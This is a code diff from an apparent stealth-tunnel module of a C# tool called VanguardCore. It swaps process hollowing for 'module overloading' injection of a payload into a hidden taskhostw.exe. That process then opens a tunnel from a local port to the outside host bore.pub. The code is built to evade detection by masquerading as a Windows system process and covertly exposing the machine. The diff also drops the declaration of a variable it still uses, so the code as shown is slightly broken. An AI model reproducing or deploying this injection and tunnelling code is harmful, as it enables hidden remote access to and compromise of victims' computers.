@@ -89,32 +89,34 @@ namespace VanguardCore.Modules
 
                 _ = Task.Run(() => AcceptClients());
 
-                // [PRO STEALTH] Iterative Process Hollowing (No Disk Drop)
-                bool injected = false;
-                Microsoft.Win32.SafeHandles.SafeFileHandle stdoutPipe = null;
-                string cmdLine = $"svchost.exe local {_localPort} --to bore.pub";
-
-                foreach (var host in TARGET_HOSTS)
+                // Start a legitimate host process with redirected output
+                ProcessStartInfo psi = new ProcessStartInfo(@"C:\Windows\System32\taskhostw.exe", $"local {_localPort} --to bore.pub");
+                psi.RedirectStandardOutput = true;
+                psi.UseShellExecute = false;
+                psi.CreateNoWindow = true;
+                psi.WindowStyle = ProcessWindowStyle.Hidden;
+                Process hostProc = Process.Start(psi);
+                
+                if (hostProc != null)
                 {
-                    if (!File.Exists(host)) continue;
-
-                    Console.WriteLine($"[PROXY] Attempting injection into {Path.GetFileName(host)}...");
-                    if (HollowingService.RunPEWithOutput(host, payload, cmdLine, out stdoutPipe, out _hProcess))
+                    Thread.Sleep(500); // Allow modules and DLLs to load
+                    if (InjectionService.ModuleOverloading("taskhostw", payload))
                     {
                         injected = true;
-                        break;
+                        _hProcess = hostProc.Handle;
                     }
                 }
 
                 if (!injected) {
                     Stop();
-                    return "[!] Failed to start stealth tunnel (Hollowing fail)";
+                    hostProc?.Kill();
+                    return "[!] Failed to start stealth tunnel (Injection fail)";
                 }
 
-                // Wait for port from pipe (timeout 15s)
+                // Wait for port from process output (timeout 15s)
                 string output = "";
                 DateTime start = DateTime.Now;
-                using (var reader = new StreamReader(new FileStream(stdoutPipe, FileAccess.Read)))
+                using (var reader = hostProc.StandardOutput)
                 {
                     while ((DateTime.Now - start).TotalSeconds < 15)
                     {
